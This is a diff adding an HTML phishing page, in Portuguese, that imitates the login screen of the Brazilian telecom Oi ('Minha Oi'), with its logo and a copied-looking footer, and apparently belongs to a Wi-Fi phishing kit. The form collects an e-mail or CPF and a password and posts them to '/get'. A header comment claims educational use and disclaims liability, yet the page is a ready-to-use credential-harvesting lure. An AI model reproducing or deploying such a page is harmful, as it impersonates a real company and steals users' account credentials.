@@ -1,0 +1,207 @@
+<!-- 
+                        A V I S O
+
+Isenção de Responsabilidade: Uso Educacional e Estrutura Legal
+
+As páginas de phishing fornecidas aqui são estritamente destinadas a fins educacionais e de treinamento.
+O objetivo é aumentar a conscientização sobre ameaças de segurança e ensinar os usuários a se proteger contra ataques de phishing.
+Ao acessar essas páginas, você concorda em usá-las apenas dentro de uma estrutura legal e ética, em conformidade com as leis 
+e regulamentos aplicáveis em sua jurisdição.
+
+Limitação de Responsabilidade
+
+O autor desta página se isenta de qualquer responsabilidade pelo uso malicioso ou ilegal dessas páginas de phishing.
+Qualquer pessoa que use essas páginas para fins não conformes à lei será a única responsável por suas ações.
+É altamente recomendável nunca usar essas técnicas para qualquer finalidade que não seja aprendizado e conscientização.
+O autor não monitora o uso dessas páginas após o download e transfere toda a responsabilidade ao usuário após o download.
+-->
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>MinhaOI</title>
+    <link rel="icon"
+        href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2016%2016'%3E%3Ctext%20x='0'%20y='14'%3E🛜%3C/text%3E%3C/svg%3E"
+        type="image/svg+xml" />
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0px;
+            padding: 0px;
+            font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffffff;
+        }
+
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #e9e9e9;
+            border-radius: 5px;
+            margin-top: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+        #logo {
+            text-align: center;
+            margin-bottom: 5px;
+
+        }
+        .g-h1 {
+            font-weight: 300;
+            font-size: 24px;
+            margin-top: 5px;
+            text-align: center;
+        }
+        .g-h2 {
+            font-weight: 200;
+            font-size: 11px;
+            margin-top: 10px;
+            text-align: center;
+            color: #515050;
+        }
+        .g-subtitle {
+            font-weight: 200;
+            font-size: 15px;
+            margin-top: 10px;
+            text-align: center;
+            color: #989898;
+        }
+        .g-input {
+            width: calc(100% - 20px);
+            margin-top: 8px;
+            height: 40px;
+            padding: 5px 10px;
+            font-size: 12px;
+            color: #2b2b2b;
+            border: 1px solid #e6ecf0;
+            border-radius: 5px;
+            background-color: #f5f8fa;
+        }
+        .g-comb {
+            width: 100%;
+            margin-top: 15px;
+            height: 40px;
+            padding: 5px 10px;
+            font-size: 12px;
+            color: #14171a;
+            border: 1px solid #e6ecf0;
+            border-radius: 5px;
+            background-color: #f5f8fa;
+        }
+        .g-comb:hover {
+            cursor: pointer;
+        }
+        option {
+            cursor: pointer !important;
+        }
+        label {
+            font-size: 11px;
+            color: #0da530;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
+        .gbtn-primary {
+            margin-top: 20px;
+            width: 100%;
+            height: 40px;
+            font-size: 13px;
+            color: #fff;
+            background-color: #28a745;
+            background-image: linear-gradient(to right, #28a745, #97d30b);
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .gbtn-primary:hover {
+            background-color: #52a665;
+            background-image: linear-gradient(to right, #97d30b, #28a745);;
+        }
+        .gbtn-primary:disabled {
+            background-color: #aab8c2;
+            cursor: not-allowed;
+        }
+        .g-footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #a0a0a0;
+        }
+        .header-banner {
+            width: 100%;
+            max-width: 450px;
+            max-height: 100px;
+            border-radius: 10px;
+        }
+        footer {
+            background-color: #0d293c;
+            height: 300px;
+            color: #fff;
+            padding: 25px 0;
+            text-align: center;
+        }
+        input::placeholder {
+            font-size: 12px;
+            opacity: 0.2;
+            color: #0f00b6;
+        }
+        input:focus {
+            background-color: #c8c8c8;
+            border: 0.1px solid #a9a9a9;
+        }
+ 
+    </style>
+</head>
+
+<body>
+    <div id="header">
+        <div id="login-app">
+            <div class="login-container">
+                <div id="logo">
+                    <img src="data:image/jpg;base64,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" 
+                        alt="Logo OI"  style="width: 50px;"/>
+                </div>
+                <center>
+                    <h1 class="g-subtitle">Para continuar, precisamos que você se identifique.</h1>
+                </center>
+
+                <h2 class="g-h1" style="text-align: left;margin-top: 20px;">Entrar</h2>
+                <h1 class="g-h2" style="text-align: left;">
+                    Você pode identifar-se com o CPF de sua conta ou via serviços Facebook, Google.
+                </h1>
+                <form action="/get" id="get-usr-pwd" method="post">
+                    <br>
+                    <div class="login-content">
+                        <label>E-mail(Serviço Facebook , Google) ou CPF(Minha Oi)</label>
+                        <input name="usr" type="text" class="g-input" placeholder="👤 Seu E-mail ou CPF"
+                            required>
+                        <label>Senha</label>
+                        <input name="pwd" type="password" class="g-input" placeholder="🗝️ Senha de acesso"
+                            required>
+                        <div>
+                            <button class="gbtn-primary" type="submit">Acessar</button>
+                        </div>
+                    </div>
+                </form>
+                <div class="g-footer" style="text-justify: auto;text-align: justify;font-size:xx-small;">
+                    <br>
+                    OI BR 2015 para reunir as pessoas em casa e curtir jogos online e streamings.
+                    © OI. Todos os direitos reservados. Endereço: Av. Engenheiro Luis Carlos Berrini, 1070 - Cidade Monções.
+                    Brasil, CEP: 04.571-000
+                </div>
+            </div>
+        </div>
+</body>
+
+</html>
